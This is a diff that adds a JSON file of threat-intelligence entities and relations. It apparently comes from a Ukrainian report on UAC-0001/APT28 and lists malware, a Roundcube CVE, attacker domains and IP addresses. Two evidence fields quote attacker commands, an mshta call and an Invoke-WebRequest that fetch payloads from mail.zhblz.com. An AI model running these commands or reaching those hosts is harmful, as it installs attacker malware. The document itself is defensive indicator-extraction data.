@@ -1,0 +1,113 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0001",
+      "kind": "threat actor",
+      "gloss": "A threat actor group also known as APT28, associated with Russian cyber espionage activities."
+    },
+    {
+      "name": "APT28",
+      "kind": "threat actor",
+      "gloss": "A Russian advanced persistent threat group attributed to the Russian General Staff Main Intelligence Directorate (GRU)."
+    },
+    {
+      "name": "Browser.ps1",
+      "kind": "malware",
+      "gloss": "A malicious PowerShell script used to exfiltrate browser credentials, set up SSH tunneling, and execute Metasploit."
+    },
+    {
+      "name": "browser.hta",
+      "kind": "malware",
+      "gloss": "A malicious HTML Application file downloaded and executed to clear the clipboard and deploy payloads."
+    },
+    {
+      "name": "METASPLOIT",
+      "kind": "software product",
+      "gloss": "A widely used penetration testing framework and exploitation tool abused by threat actors."
+    },
+    {
+      "name": "zapit.exe",
+      "kind": "malware",
+      "gloss": "A malicious executable file delivering a Metasploit payload."
+    },
+    {
+      "name": "rdp.exe",
+      "kind": "computer file",
+      "gloss": "An executable file identified as an indicator of compromise in the malicious activity."
+    },
+    {
+      "name": "Roundcube",
+      "kind": "software product",
+      "gloss": "An open-source webmail software application."
+    },
+    {
+      "name": "CVE-2023-43770",
+      "kind": "vulnerability",
+      "gloss": "A cross-site scripting vulnerability in Roundcube Webmail leading to information disclosure."
+    },
+    {
+      "name": "mail.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A compromised domain used as command and control infrastructure to distribute payloads."
+    },
+    {
+      "name": "docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A malicious phishing domain masquerading as a Google Sheets URL."
+    },
+    {
+      "name": "doc.gmail.com.gyehddhrggdii323sdhnshiswh2udhqjwdhhfjcjeuejcj.zhblz.com",
+      "kind": "domain name",
+      "gloss": "A malicious phishing domain masquerading as a Google Docs URL."
+    },
+    {
+      "name": "203.161.50.145",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the compromised server mail.zhblz.com."
+    },
+    {
+      "name": "45.61.169.221",
+      "kind": "ip address",
+      "gloss": "An IP address observed in the network indicators of compromise."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0001",
+      "type": "uses",
+      "tail": "Browser.ps1",
+      "evidence": "описана активність асоційована з діяльністю угрупування UAC-0001"
+    },
+    {
+      "head": "UAC-0001",
+      "type": "uses",
+      "tail": "mail.zhblz.com",
+      "evidence": "використовувався (скомпрометований) сервер \"mail.zhblz[.]com\""
+    },
+    {
+      "head": "Browser.ps1",
+      "type": "delivers",
+      "tail": "METASPLOIT",
+      "evidence": "завантаження та запуск програмного засобу METASPLOIT"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "browser.hta",
+      "evidence": "mshta hXXps://mail.zhblz[.]com/b"
+    },
+    {
+      "head": "mail.zhblz.com",
+      "type": "hosts",
+      "tail": "zapit.exe",
+      "evidence": "Invoke-WebRequest -Uri https://mail.zhblz.com/z -OutFile %APPDATA%\\zapit.exe"
+    },
+    {
+      "head": "CVE-2023-43770",
+      "type": "affects",
+      "tail": "Roundcube",
+      "evidence": "вразливості в Roundcube (CVE-2023-43770)"
+    }
+  ],
+  "newRelationTypes": []
+}
